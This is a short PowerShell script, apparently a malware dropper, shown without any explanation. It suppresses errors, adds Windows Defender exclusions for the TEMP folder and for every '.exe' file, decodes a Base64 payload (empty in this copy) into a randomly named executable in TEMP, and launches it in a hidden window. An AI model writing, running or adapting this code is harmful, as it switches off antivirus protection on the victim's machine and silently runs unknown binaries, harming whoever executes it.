$ErrorActionPreference='SilentlyContinue'
try{Add-MpPreference -ExclusionPath $env:TEMP -EA 0}catch{}
try{Add-MpPreference -ExclusionExtension '.exe' -EA 0}catch{}
Start-Sleep -Milliseconds 500
$d=[Convert]::FromBase64String('')
$p=Join-Path $env:TEMP 'efdgzo.exe'
[IO.File]::WriteAllBytes($p,$d)
Start-Sleep -Milliseconds 200
Start-Process $p -WindowStyle Hidden
